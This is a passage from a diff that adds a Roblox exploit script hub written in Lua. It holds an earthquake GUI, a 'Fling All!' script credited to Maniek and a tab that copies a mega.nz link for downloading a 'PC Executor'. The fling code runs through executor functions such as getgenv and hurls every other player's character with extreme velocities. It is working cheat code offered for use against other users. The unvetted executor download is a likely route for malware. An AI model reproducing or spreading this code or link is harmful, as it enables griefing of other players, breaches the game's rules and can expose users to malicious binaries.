+startButton.Font = Enum.Font.SourceSansBold
+startButton.TextSize = 18
+startButton.Parent = frame
+
+-- Stop Button
+local stopButton = Instance.new("TextButton")
+stopButton.Size = UDim2.new(0, 120, 0, 40)
+stopButton.Position = UDim2.new(0, 160, 0, 90)
+stopButton.Text = "Stop"
+stopButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+stopButton.TextColor3 = Color3.new(1, 1, 1)
+stopButton.Font = Enum.Font.SourceSansBold
+stopButton.TextSize = 18
+stopButton.Parent = frame
+
+-- Earthquake Simulation Logic
+local earthquakeActive = false
+local function startEarthquake(magnitude)
+    earthquakeActive = true
+    spawn(function()
+        while earthquakeActive do
+            local offset = Vector3.new(
+                math.random(-magnitude, magnitude) * 0.1,
+                0,
+                math.random(-magnitude, magnitude) * 0.1
+            )
+            for _, part in pairs(workspace:GetDescendants()) do
+                if part:IsA("BasePart") and part.Anchored then
+                    part.Position = part.Position + offset
+                end
+            end
+            wait(0.1)
+        end
+    end)
+end
+
+local function stopEarthquake()
+    earthquakeActive = false
+end
+
+-- Button Actions
+startButton.MouseButton1Click:Connect(function()
+    local magnitude = tonumber(magnitudeInput.Text)
+    if magnitude and magnitude > 0 then
+        stopEarthquake() -- Stop any existing earthquake
+        startEarthquake(magnitude)
+    else
+        magnitudeInput.Text = "Invalid Magnitude"
+    end
+end)
+
+stopButton.MouseButton1Click:Connect(function()
+    stopEarthquake()
+end)
+
+end)
+
+MainSection:NewButton("Earthquake(FE)[LAGGY]", "ButtonInfo", function()
+-- Roblox Script: Earthquake GUI with Adjustable Magnitude
+
+-- Define the earthquake function
+local function startEarthquake(magnitude)
+    local shaking = true
+    
+    spawn(function()
+        while shaking do
+            local offset = Vector3.new(
+                math.random(-magnitude, magnitude) * 0.1,
+                0,
+                math.random(-magnitude, magnitude) * 0.1
+            )
+            for _, part in pairs(workspace:GetDescendants()) do
+                if part:IsA("BasePart") and not part.Anchored then
+                    part.Position = part.Position + offset
+                end
+            end
+            wait(0.1)
+        end
+    end)
+
+    return function()
+        shaking = false
+    end
+end
+
+-- Create the GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "EarthquakeGui"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 200)
+frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 30)
+titleLabel.Position = UDim2.new(0, 0, 0, 0)
+titleLabel.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+titleLabel.Text = "Earthquake Control"
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.TextSize = 20
+titleLabel.Parent = frame
+
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -35, 0, 5)
+closeButton.Text = "X"
+closeButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+closeButton.TextColor3 = Color3.new(1, 1, 1)
+closeButton.Font = Enum.Font.SourceSansBold
+closeButton.TextSize = 18
+closeButton.Parent = frame
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+local minimizeButton = Instance.new("TextButton")
+minimizeButton.Size = UDim2.new(0, 30, 0, 30)
+minimizeButton.Position = UDim2.new(1, -70, 0, 5)
+minimizeButton.Text = "-"
+minimizeButton.BackgroundColor3 = Color3.new(0.2, 0.6, 0.8)
+minimizeButton.TextColor3 = Color3.new(1, 1, 1)
+minimizeButton.Font = Enum.Font.SourceSansBold
+minimizeButton.TextSize = 18
+minimizeButton.Parent = frame
+
+local isMinimized = false
+minimizeButton.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    frame.Size = isMinimized and UDim2.new(0, 300, 0, 30) or UDim2.new(0, 300, 0, 200)
+    for _, child in ipairs(frame:GetChildren()) do
+        if child ~= titleLabel and child ~= closeButton and child ~= minimizeButton then
+            child.Visible = not isMinimized
+        end
+    end
+end)
+
+local magnitudeInput = Instance.new("TextBox")
+magnitudeInput.Size = UDim2.new(0, 260, 0, 30)
+magnitudeInput.Position = UDim2.new(0, 20, 0, 50)
+magnitudeInput.PlaceholderText = "Enter Magnitude"
+magnitudeInput.Text = ""
+magnitudeInput.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+magnitudeInput.TextColor3 = Color3.new(1, 1, 1)
+magnitudeInput.Font = Enum.Font.SourceSansBold
+magnitudeInput.TextSize = 18
+magnitudeInput.Parent = frame
+
+local startButton = Instance.new("TextButton")
+startButton.Size = UDim2.new(0, 120, 0, 40)
+startButton.Position = UDim2.new(0, 20, 0, 100)
+startButton.Text = "Start"
+startButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
+startButton.TextColor3 = Color3.new(1, 1, 1)
+startButton.Font = Enum.Font.SourceSansBold
+startButton.TextSize = 18
+startButton.Parent = frame
+
+local stopButton = Instance.new("TextButton")
+stopButton.Size = UDim2.new(0, 120, 0, 40)
+stopButton.Position = UDim2.new(0, 160, 0, 100)
+stopButton.Text = "Stop"
+stopButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+stopButton.TextColor3 = Color3.new(1, 1, 1)
+stopButton.Font = Enum.Font.SourceSansBold
+stopButton.TextSize = 18
+stopButton.Parent = frame
+
+local stopEarthquake
+
+startButton.MouseButton1Click:Connect(function()
+    local magnitude = tonumber(magnitudeInput.Text)
+    if magnitude and magnitude > 0 then
+        if stopEarthquake then stopEarthquake() end
+        stopEarthquake = startEarthquake(magnitude)
+    else
+        magnitudeInput.Text = "Invalid Magnitude"
+    end
+end)
+
+stopButton.MouseButton1Click:Connect(function()
+    if stopEarthquake then
+        stopEarthquake()
+        stopEarthquake = nil
+    end
+end)
+
+end)
+MainSection:NewButton("Fling All!", "ButtonInfo", function()
+    --[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
+
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+
+local AllBool = false
+
+local GetPlayer = function(Name)
+    Name = Name:lower()
+    if Name == "all" or Name == "others" then
+        AllBool = true
+        return
+    elseif Name == "random" then
+        local GetPlayers = Players:GetPlayers()
+        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
+        return GetPlayers[math.random(#GetPlayers)]
+    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
+        for _,x in next, Players:GetPlayers() do
+            if x ~= Player then
+                if x.Name:lower():match("^"..Name) then
+                    return x;
+                elseif x.DisplayName:lower():match("^"..Name) then
+                    return x;
+                end
+            end
+        end
+    else
+        return
+    end
+end
+
+local Message = function(_Title, _Text, Time)
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
+end
+
+local SkidFling = function(TargetPlayer)
+    local Character = Player.Character
+    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+    local RootPart = Humanoid and Humanoid.RootPart
+
+    local TCharacter = TargetPlayer.Character
+    local THumanoid
+    local TRootPart
+    local THead
+    local Accessory
+    local Handle
+
+    if TCharacter:FindFirstChildOfClass("Humanoid") then
+        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+    end
+    if THumanoid and THumanoid.RootPart then
+        TRootPart = THumanoid.RootPart
+    end
+    if TCharacter:FindFirstChild("Head") then
+        THead = TCharacter.Head
+    end
+    if TCharacter:FindFirstChildOfClass("Accessory") then
+        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+    end
+    if Accessoy and Accessory:FindFirstChild("Handle") then
+        Handle = Accessory.Handle
+    end
+
+    if Character and Humanoid and RootPart then
+        if RootPart.Velocity.Magnitude < 50 then
+            getgenv().OldPos = RootPart.CFrame
+        end
+        if THumanoid and THumanoid.Sit and not AllBool then
+            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
+        end
+        if THead then
+            workspace.CurrentCamera.CameraSubject = THead
+        elseif not THead and Handle then
+            workspace.CurrentCamera.CameraSubject = Handle
+        elseif THumanoid and TRootPart then
+            workspace.CurrentCamera.CameraSubject = THumanoid
+        end
+        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+            return
+        end
+        
+        local FPos = function(BasePart, Pos, Ang)
+            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+        end
+        
+        local SFBasePart = function(BasePart)
+            local TimeToWait = 2
+            local Time = tick()
+            local Angle = 0
+
+            repeat
+                if RootPart and THumanoid then
+                    if BasePart.Velocity.Magnitude < 50 then
+                        Angle = Angle + 100
+
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+                    else
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+                        
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+                    end
+                else
+                    break
+                end
+            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+        end
+        
+        workspace.FallenPartsDestroyHeight = 0/0
+        
+        local BV = Instance.new("BodyVelocity")
+        BV.Name = "EpixVel"
+        BV.Parent = RootPart
+        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+        
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+        
+        if TRootPart and THead then
+            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+                SFBasePart(THead)
+            else
+                SFBasePart(TRootPart)
+            end
+        elseif TRootPart and not THead then
+            SFBasePart(TRootPart)
+        elseif not TRootPart and THead then
+            SFBasePart(THead)
+        elseif not TRootPart and not THead and Accessory and Handle then
+            SFBasePart(Handle)
+        else
+            return Message("Error Occurred", "Target is missing everything", 5)
+        end
+        
+        BV:Destroy()
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+        workspace.CurrentCamera.CameraSubject = Humanoid
+        
+        repeat
+            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+            Humanoid:ChangeState("GettingUp")
+            table.foreach(Character:GetChildren(), function(_, x)
+                if x:IsA("BasePart") then
+                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+                end
+            end)
+            task.wait()
+        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+        workspace.FallenPartsDestroyHeight = getgenv().FPDH
+    else
+        return Message("Error Occurred", "Random error", 5)
+    end
+end
+
+if not Welcome then Message("Script by Maniek", "Enjoy!", 5) end
+getgenv().Welcome = true
+if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
+
+if AllBool then
+    for _,x in next, Players:GetPlayers() do
+        SkidFling(x)
+    end
+end
+
+for _,x in next, Targets do
+    if GetPlayer(x) and GetPlayer(x) ~= Player then
+        if GetPlayer(x).UserId ~= 1414978355 then
+            local TPlayer = GetPlayer(x)
+            if TPlayer then
+                SkidFling(TPlayer)
+            end
+        else
+            Message("Error Occurred", "This user is whitelisted! (Owner)", 5)
+        end
+    elseif not GetPlayer(x) and not AllBool then
+        Message("Error Occurred", "Username Invalid", 5)
+    end
+end
+end)
+
+local Main = Window:NewTab("Download PC Executor")
+local MainSection = Main:NewSection("Get Executor")
+
+
+MainSection:NewButton("Soon", "ButtonInfo", function()
+    setclipboard ""
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Soon",
+    Text = "Soon",
+    Duration = "5"
+})
+end)
+
+MainSection:NewButton("Direct Download Link", "ButtonInfo", function()
+    setclipboard "https://mega.nz/folder/i7YXCAAD#8F-bnyxG0MnfHFbQYzsXRA"
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Link Copied To Clipbord!",
+    Text = "Paste It On Google To Download Executor!",
+    Duration = "5"
+})
+end)
+
+local Main = Window:NewTab("Credits")
+local MainSection = Main:NewSection("By Maniek")
